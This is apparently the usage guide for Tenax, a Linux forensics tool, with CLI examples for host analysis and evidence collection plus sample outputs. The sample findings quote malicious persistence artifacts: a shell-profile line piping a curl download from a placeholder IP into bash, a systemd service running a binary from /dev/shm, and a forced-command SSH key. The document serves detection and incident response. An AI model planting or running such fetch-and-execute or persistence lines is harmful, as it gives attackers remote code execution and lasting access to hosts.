# Tenax Usage Examples

These examples reflect the current CLI and output structure in the repository.

## Analyze Examples

Analyze the live host with default text output:

```bash
tenax analyze
```

Analyze only SSH and systemd findings from a mounted image:

```bash
tenax analyze \
  --root-prefix /mnt/forensics/image \
  --source ssh,systemd \
  --severity high \
  --sort severity \
  --top 25
```

Write JSON output to an explicit file:

```bash
tenax analyze --format json --output /cases/analysis/tenax-analyze.json
```

Sample text output:

```text
=== TENAX ANALYZE RESULTS ===
Findings shown: 3 of 3
Modules: 3/3 succeeded
Limitations:
- Only the selected analyzer modules were executed.
- Analysis targeted the live host root.
- User-scoped modules enumerated 2 local user home paths.
- Unreadable target paths may reduce observable findings; only accessible artifacts can be analyzed.

CRITICAL (1)
TX-SHELL_PROFILES-91FC6A20 CRITICAL shell_profiles /home/analyst/.bashrc
  score=95 rule=TX-RULE-SHELL_PROFILES-NETWORK_RETRIEVAL
  reason=Shell profile downloads and executes payload inline
  tags=network-retrieval, shell-profiles, shell-execution, user-persistence, user-scope
  preview=curl http://198.51.100.7/payload.sh | bash

HIGH (2)
TX-SYSTEMD-64A4A3FB HIGH systemd /etc/systemd/system/backupd.service
  score=78 rule=TX-RULE-SYSTEMD-SERVICE_DEFINITION
  reason=systemd service executes payload from a temporary path
  tags=root-execution, scheduled-start, service-definition, system-scope, systemd, systemd-unit, temp-path
  preview=ExecStart=/dev/shm/backupd --silent

TX-SSH-3AB87461 HIGH ssh /root/.ssh/authorized_keys
  score=74 rule=TX-RULE-SSH-SSH_PERSISTENCE
  reason=authorized_keys entry uses command= restriction/execution
  tags=credential-surface, ssh, ssh-persistence, user-persistence, user-scope
  preview=command="/usr/local/bin/keywrap" ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA...
```

## Collect Examples

Create a structured bundle:

```bash
tenax collect --mode structured
```

Create an evidence bundle from a mounted root and archive it:

```bash
tenax collect \
  --mode evidence \
  --root-prefix /mnt/forensics/image \
  --modules ssh,pam,systemd \
  --archive
```

Disable secondary reference following:

```bash
tenax collect --mode minimal --no-follow-references
```

Sample terminal output:

```text
=== TENAX COLLECT RESULTS ===
Mode: evidence
Artifacts: 4
References: 3
Errors: 0
Saved manifest to: /cases/collections/collect_20260326_143011/manifest.json
Saved archive to: /cases/collections/collect_20260326_143011.tgz
```

Sample saved bundle:

```text
collect_20260326_143011/
|-- artifacts.json
|-- errors.json
|-- hashes.txt
|-- manifest.json
|-- references.json
|-- summary.txt
`-- collected/
    |-- systemd/
    |   `-- etc_systemd_system/backupd.service
    `-- systemd_reference/
        `-- dev_shm/backupd
```

Representative `manifest.json` excerpt:

```json
{
  "schema_version": "2.0",
  "mode": "evidence",
  "summary": {
    "artifact_count": 4,
    "direct_artifact_count": 2,
    "reference_artifact_count": 2,
    "reference_count": 3,
    "required_reference_count": 2,
    "followed_required_reference_count": 2,
    "copied_artifact_count": 4,
    "error_count": 0
  },
  "scope": {
    "root_prefix": "/mnt/forensics/image",
    "target_root": "/",
    "all_users": [
      "root",
      "svc-backup",
      "analyst"
    ]
  }
}
```

Representative `summary.txt` excerpt:

```text
=== TENAX COLLECT SUMMARY ===

Collection ID: collect_20260326_143011
Mode: evidence
Host: ir-jumpbox
User: responder
Target Root: /

--- Totals ---
Artifacts collected: 4
Direct artifacts: 2
Reference artifacts: 2
References found: 3
Required references followed: 2 of 2
Artifacts copied: 4
Errors: 0
```
